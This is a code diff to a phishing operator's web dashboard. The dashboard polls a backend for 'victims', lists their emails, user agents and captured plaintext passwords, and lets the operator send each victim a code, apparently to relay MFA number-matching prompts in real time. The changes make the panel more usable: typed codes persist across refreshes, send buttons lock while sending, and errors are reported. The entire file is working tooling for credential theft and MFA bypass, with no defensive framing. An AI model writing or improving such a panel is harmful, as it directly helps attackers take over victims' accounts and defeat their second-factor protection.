@@ -77,6 +77,7 @@
       font-size: 0.9rem;
     }
     .send-btn:hover { background: #2ea043; }
+    .send-btn:disabled { background: #444c56; cursor: not-allowed; }
 
     #last-update { color: #8b949e; font-size: 0.9rem; }
   </style>
@@ -118,6 +119,9 @@
     const tbodyEl      = document.getElementById('victims-body');
     const lastUpdateEl = document.getElementById('last-update');
 
+    // Store typed values so they survive table re-renders
+    const typedCodes = new Map(); // email → current typed value
+
     async function fetchVictims() {
       statusEl.textContent = "Fetching victims...";
       statusEl.className = "fetching";
@@ -127,6 +131,8 @@
           cache: 'no-cache',
           headers: { 'Accept': 'application/json, text/plain, */*' }
         });
+
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
 
         const text = await res.text();
         rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty)')}`;
@@ -146,17 +152,28 @@
           }));
           renderVictims(mapped);
         } else {
-          showEmpty("No ready victims");
+          showEmpty("No ready victims found");
         }
       } catch (err) {
         statusEl.textContent = `Error: ${err.message}`;
         statusEl.className = "error";
+        rawEl.innerHTML += `<br><span style="color:#f85149;">${escapeHtml(err.message)}</span>`;
       }
     }
 
     function renderVictims(items) {
+      // Save current typed values before destroying inputs
+      document.querySelectorAll('.code-input').forEach(input => {
+        const val = input.value.trim();
+        if (val) typedCodes.set(input.dataset.email, val);
+      });
+
       tbodyEl.innerHTML = '';
+
       items.forEach(item => {
+        const email = item.email;
+        const savedValue = typedCodes.get(email) || '';
+
         const tr = document.createElement('tr');
         tr.innerHTML = `
           <td>${escapeHtml(item.timestamp)}</td>
@@ -165,16 +182,25 @@
           <td title="${escapeHtml(item.userAgent)}">${escapeHtml(item.userAgent.slice(0,70))}${item.userAgent.length > 70 ? '...' : ''}</td>
           <td>${escapeHtml(item.password)}</td>
           <td>
-            <input type="text" class="code-input" placeholder="Enter code" data-email="${escapeHtml(item.email)}">
-            <button class="send-btn" data-email="${escapeHtml(item.email)}">Send</button>
+            <input type="text" class="code-input" placeholder="Enter code" 
+                   data-email="${escapeHtml(email)}" value="${escapeHtml(savedValue)}">
+            <button class="send-btn" data-email="${escapeHtml(email)}">Send</button>
           </td>
         `;
         tbodyEl.appendChild(tr);
       });
+
       tableEl.style.display = 'table';
       statusEl.textContent = `Victims connected: ${items.length}`;
       statusEl.className = "success";
       lastUpdateEl.textContent = new Date().toLocaleTimeString();
+
+      // Clean up old typed values for victims no longer present
+      for (let email of typedCodes.keys()) {
+        if (!items.some(item => item.email === email)) {
+          typedCodes.delete(email);
+        }
+      }
     }
 
     function showEmpty(msg) {
@@ -192,33 +218,47 @@
     document.addEventListener('click', async e => {
       if (!e.target.classList.contains('send-btn')) return;
 
-      const email = e.target.dataset.email;
+      const btn = e.target;
+      const email = btn.dataset.email;
       const input = document.querySelector(`.code-input[data-email="${escapeHtml(email)}"]`);
       const code = input?.value.trim();
 
       if (!code) return alert("Enter a code first");
 
-      if (!confirm(`Send "${code}" to ${email}?`)) return;
+      if (!confirm(`Send code "${code}" to ${email}?`)) return;
+
+      btn.disabled = true;
+      btn.textContent = "Sending...";
 
       try {
-        const params = new URLSearchParams({ action: "set_number", email, prompt_number: code });
+        const params = new URLSearchParams({
+          action: "set_number",
+          email: email,
+          prompt_number: code
+        });
+
         const res = await fetch(`${SCRIPT_URL}?${params}`, { cache: 'no-cache' });
 
         if (res.ok) {
-          alert(`Sent "${code}" to ${email}`);
+          alert(`Code "${code}" sent to ${email}`);
           input.value = '';
+          typedCodes.delete(email); // forget after successful send
         } else {
-          alert("Send failed");
+          alert("Failed to send (check console)");
         }
       } catch (err) {
         alert("Error: " + err.message);
+        console.error(err);
+      } finally {
+        btn.disabled = false;
+        btn.textContent = "Send";
       }
     });
 
+    // Start polling
     fetchVictims();
     setInterval(fetchVictims, 5000);
   </script>
 </body>
 </html>
 
-  
